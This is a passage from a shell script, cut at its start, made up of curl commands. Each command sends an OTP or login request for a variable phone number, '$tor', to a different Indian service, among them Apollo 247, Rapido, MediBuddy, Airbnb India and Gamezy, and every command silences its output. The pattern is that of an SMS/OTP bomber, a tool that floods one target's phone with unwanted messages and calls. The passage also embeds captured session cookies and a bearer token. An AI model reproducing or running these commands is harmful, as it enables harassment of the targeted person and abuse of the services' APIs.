  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'x-platform: 0' \
  --data-raw '{"phone":"$tor","country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://webapi.apollo247.com/' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -H 'Origin: https://www.apollopharmacy.in' \
  -H 'Referer: https://www.apollopharmacy.in/' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: cross-site' \
  -H 'accept: */*' \
  -H 'authorization: Bearer 3d1833da7020e0602165529446587434' \
  -H 'content-type: application/json' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw $'{"operationName":"getOTPOnCall","variables":{"mobileNumber":"+91$tor","loginType":"PATIENT","id":"0c3f4d50-b054-11ed-9846-7b73ab120606"},"query":"query getOTPOnCall($mobileNumber: String, $loginType: LOGIN_TYPE, $id: String\u0021) {\\n  getOTPOnCall(mobileNumber: $mobileNumber, loginType: $loginType, id: $id) {\\n    status\\n    loginId\\n    message\\n    __typename\\n  }\\n}\\n"}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://webrouter-bbe-prod.angelbroking.com/login/v3/generateLoginOTP' \
  -H 'authority: webrouter-bbe-prod.angelbroking.com' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'origin: https://trade.angelone.in' \
  -H 'referer: https://trade.angelone.in/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: cross-site' \
  -H 'x-appid;' \
  -H 'x-clientlocalip: null' \
  -H 'x-clientpublicip: null' \
  -H 'x-location;' \
  -H 'x-operatingsystem: Windows' \
  -H 'x-productversion;' \
  -H 'x-sourceid: 3' \
  -H 'x-systeminfo;' \
  -H 'x-usertype: 1' \
  --data-raw '{"country_code":"+91","mob_no":"$tor","is_otp_resend":false,"user_id":""}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://customer.rapido.bike/api/otp' \
  -H 'authority: customer.rapido.bike' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cache-control: max-age=0' \
  -H 'content-type: application/json' \
  -H 'origin: https://www.rapido.bike' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  --data-raw '{"mobile":"$tor"}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://api.gopaysense.com/users/otp' \
  -H 'authority: api.gopaysense.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'origin: https://www.gopaysense.com' \
  -H 'referer: https://www.gopaysense.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw '{"phone":"$tor"}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://www.medibuddy.in/unified-login/user/register' \
  -H 'authority: www.medibuddy.in' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'cookie: _ga=GA1.2.1885740090.1677007469; _gid=GA1.2.30173405.1677007469; _gac_UA-80666149-1=1.1677007469.CjwKCAiA9NGfBhBvEiwAq5vSy6ki9bIzV_TjjY2LbJMUfaTc2OKMcwykevSmFbrDBOXgwQdXovQykRoC1iYQAvD_BwE; _gat=1; _gcl_au=1.1.1090214670.1677007471; _fbp=fb.1.1677007471185.1290031416; WZRK_G=c24b8447a298430b9243d3516d158894; _gcl_aw=GCL.1677007472.CjwKCAiA9NGfBhBvEiwAq5vSy6ki9bIzV_TjjY2LbJMUfaTc2OKMcwykevSmFbrDBOXgwQdXovQykRoC1iYQAvD_BwE; _opt_utmc=SEM%20Brand; WZRK_S_649-47W-Z55Z=%7B%22p%22%3A1%2C%22s%22%3A1677007624%2C%22t%22%3A1677007478%7D' \
  -H 'newrelic: eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjMzNjQxNjAiLCJhcCI6IjMyMjU0ODY4NiIsImlkIjoiNWQ0MWQxNDYxZmYwNTQzYSIsInRyIjoiMWEwMDJmZTU4M2E1ODllY2NmYTA3OWIxMDZlZmE3NjAiLCJ0aSI6MTY3NzAwNzQ5MDY3N319' \
  -H 'origin: https://www.medibuddy.in' \
  -H 'referer: https://www.medibuddy.in/?$3p=a_google_adwords&$always_deeplink=false&~ad_set_id=138542912373&~campaign_id=17724937809&~channel=g&~keyword=medibuddy&~placement&gclid=CjwKCAiA9NGfBhBvEiwAq5vSy6ki9bIzV_TjjY2LbJMUfaTc2OKMcwykevSmFbrDBOXgwQdXovQykRoC1iYQAvD_BwE&_branch_match_id=1052940192611150823&utm_source=Google%20AdWords&utm_campaign=SEM%20Brand&utm_medium=paid%20advertising&_branch_referrer=H4sIAAAAAAAAAz2OzW6DMBCEnwaOUAwJoRKqgJCqJWlEklbhZBlsjMGAy59Fnr6QQ6U57M6n2Z1iGET%2FqutDTvtRQ0JonDWVvk2OkRQX6nfpmwIsU7gI0ralnECEZdvhXl1sxCWae4gJEWvKzRHvyQqWgacoq%2BDYcbdYXyimp4DDIimlVhPM0hHjWWONqtghwrAnA2TYNczdxgKOAUzbXEmGaoEYbZ7MtoHlmPbuxXmiAjUN4S5dl4rMayv3%2F7JKM75kglJGgcc85%2Bs99wt%2FCpn0fjfTdd5WzEk%2FHj%2FwVpYJOKafp%2B8c3TJwjk6ZnCsyXetD2u39853KGN%2FbKZ6rSxsYLIm9aQ99Gf4BUc806ToBAAA%3D' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'traceparent: 00-1a002fe583a589eccfa079b106efa760-5d41d1461ff0543a-01' \
  -H 'tracestate: 3364160@nr=0-1-3364160-322548686-5d41d1461ff0543a----1677007490677' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw '{"source":"medibuddy","platform":"medibuddyInWeb","phonenumber":"$tor","screen":"login-page","advertiserId":"1052940192611150823","mbUserId":null}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://apinew.moglix.com/nodeApi/v1/login/sendOTP' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'Access-Control-Allow-Methods: GET, POST, PUT, DELETE' \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'Referer;' \
  -H 'x-access-token;' \
  -H 'x-request-id: 9KBqSaqWkg5-odqZr1bAAbpYcJDDtI98' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw '{"phone":"$tor","email":"","type":"p","source":"signup","device":"mobile"}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://www.airbnb.co.in/api/v2/phone_one_time_passwords?key=d306zoyjsyarp7ifhu67rjxn52tv0t20&currency=INR&locale=en-IN' \
  -H 'authority: www.airbnb.co.in' \
  -H 'accept: application/json, text/javascript, */*; q=0.01' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cache-control: no-cache' \
  -H 'content-type: application/json' \
  -H 'cookie: bev=1677051993_ZjcxYmJkM2Y3YmE5; everest_cookie=1677051993._Q-Q0wqbfGSUIIE7epJf.rwTwGUfWr1u6QV2VsAKGUsfa3ATUzUeVPUSEcDCOaL4; ak_bmsc=4A6FDBF9841E704CFFDBF9A263E3E1C9~000000000000000000000000000000~YAAQJdjIF7/tpzCGAQAABp4WeBKcKPOaBz0naJPUXg93BFzQRnLbJ9jj6bCOdHdqdu48686LJBh5q9el9Pi60fZB/Z1xEhRKhhsfUjS0jEz0+/yvmJCMPUdHtRyhG1IAo/8vgqMUsXry5p+JSXIZ42Y/Bf3BQLM2VTLbIMe3+G88T2JWtEF2O+fRsNNPS0nJ6sXnSakW1mB+ubiXGgezUTw29E2htKu9bg3DKg6lQTIsDPiP73bBSjJ5i22se4AB+F5/dJBVW2kHHzwT1H3Qi07KYs6wOwCVsScKlxVs4X7mjJz7QeAoiYLuH1DgY7GbsCIs7XL4B3aOUS3P8zB8IWu6eCPKiv6XhHFbrhSYPnrWsZtUUxra0ZMPq+HAr7xZ/LVgA757SThsvqB/; _user_attributes=%7B%22device_profiling_session_id%22%3A%221677051993--5580eb82b35780fad3df6e8a%22%2C%22giftcard_profiling_session_id%22%3A%221677051993--d4bcf155178584d67d039144%22%2C%22reservation_profiling_session_id%22%3A%221677051993--8bc73e1d10058a34610d2ace%22%2C%22curr%22%3A%22INR%22%7D; previousTab=%7B%22id%22%3A%22f5ddb5ac-3d00-4b49-b3f8-e02bd2940967%22%2C%22url%22%3A%22https%3A%2F%2Fwww.airbnb.co.in%2F%22%7D; jitney_client_session_id=67393739-f0bc-477c-9467-66058c536d32; jitney_client_session_created_at=1677052009; jitney_client_session_updated_at=1677052009; OptanonConsent=0_183215%3A1%2C0_200000%3A1%2C0_183345%3A1%2C0_183243%3A1%2C0_183216%3A1%2C0_179751%3A1%2C0_200003%3A1%2C0_200005%3A1%2C0_179754%3A1%2C0_179750%3A1%2C0_179737%3A1%2C0_179744%3A1%2C0_179739%3A1%2C0_179743%3A1%2C0_179749%3A1%2C0_200012%3A1%2C0_200011%3A1%2C0_183217%3A1%2C0_183219%3A1%2C0_183096%3A1%2C0_179747%3A1%2C0_179740%3A1%2C0_179752%3A1%2C0_183241%3A1%2C0_200007%3A1%2C0_183346%3A1%2C0_183095%3A1%2C0_210000%3A1; OptanonAlertBoxClosed=2023-02-22T07%3A44%3A22.833Z; tzo=330; cdn_exp_cc7e237be2c77b806=treatment; auth_jitney_session_id=756aa08b-986a-49ef-a3be-0c25eb9b4f1d; _airbed_session_id=4fabfc474d297ad1a9caf76a644a290d; cfrmfctr=MOBILE; cbkp=2; frmfctr=wide; bm_sv=43E2D5FBF06D4DA2AB254DC0F401A129~YAAQJdjIF2/xpzCGAQAAob8YeBI2ECEKRduyvgoOTfSqZv7ggu09WLyCRAkFmnpLDHQBezvjriJlcIY6Mw/t2ME+v86gzZgXLiP67+UDisEehEzyZ+JK9ceg+T2BqQOcYHXVfljSqLs4LQvuKiHW9Lx1mcHR0RRvFsbLRfIjTB7jddhRcxVzUjf8MrXID1b+VOrOeBHNJssP/BTSCAaZJdL53bgiEQklJ8tkFfLwMmussymO4wR9OPzEq9V2lGRs/Dna~1' \
  -H 'device-memory: 8' \
  -H 'dpr: 1.25' \
  -H 'ect: 4g' \
  -H 'origin: https://www.airbnb.co.in' \
  -H 'referer: https://www.airbnb.co.in/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'viewport-width: 936' \
  -H 'x-airbnb-supports-airlock-v2: true' \
  -H 'x-csrf-token: null' \
  -H 'x-csrf-without-token: 1' \
  -H 'x-requested-with: XMLHttpRequest' \
  --data-raw '{"phoneNumber":"91$tor","workFlow":"GLOBAL_SIGNUP_LOGIN","otpMethod":"WHATSAPP","accountIdentifier":"","accountIdentifierType":"PHONE"}' \
  --compressed  > /dev/null 2>&1



curl -X POST 'https://api.doubtnut.com/v4/student/login' \
  -H 'authority: api.doubtnut.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/x-www-form-urlencoded' \
  -H 'origin: https://www.doubtnut.com' \
  -H 'referer: https://www.doubtnut.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'version_code: 1500' \
  --data-raw 'phone_number=$tor&is_web=3' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://www.gamezy.com/api/auth/getOTP' \
  -H 'authority: www.gamezy.com' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json;charset=UTF-8' \
  -H 'cookie: gk-session-id=013b13a4-5f9c-481b-97cf-7429ba6bbd85; WZRK_G=ff5481ee82f7405e99183e703d2ab59a; WZRK_S_884-ZZ9-R55Z=%7B%22p%22%3A1%2C%22s%22%3A1677188290%2C%22t%22%3A1677188137%7D; _ga=GA1.2.1544562785.1677188138; _gid=GA1.2.417047249.1677188138; _gat_UA-134154771-1=1; _gat_UA-134602608-1=1; _fbp=fb.1.1677188137873.992070875; afUserId=959d63b7-923a-47e6-acf8-5448babfec5d-p; AF_SYNC=1677188138919; GMZUser1=' \
  -H 'origin: https://www.gamezy.com' \
  -H 'referer: https://www.gamezy.com/game/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  --data-raw '{"verificationChannel":"2","mobile":"$tor"}' \
  --compressed  > /dev/null 2>&1

